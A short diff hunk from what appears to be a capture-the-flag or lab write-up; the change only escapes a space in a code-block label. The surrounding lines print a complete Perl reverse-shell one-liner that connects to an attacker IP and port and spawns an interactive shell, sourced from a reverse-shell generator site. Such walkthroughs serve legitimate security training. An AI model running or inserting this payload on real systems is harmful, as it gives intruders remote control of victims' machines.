@@ -96,7 +96,7 @@ Task Completed
 
 - Welp, we might have to first spawn a reverse shell (I will be using [revshells.com](https://www.revshells.com/))
 
-```bash:Command Panel
+```bash:Command\ Panel
 # below is the reverse shell i used
 
 perl -e 'use Socket;$i="10.6.22.229";$p=6969;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
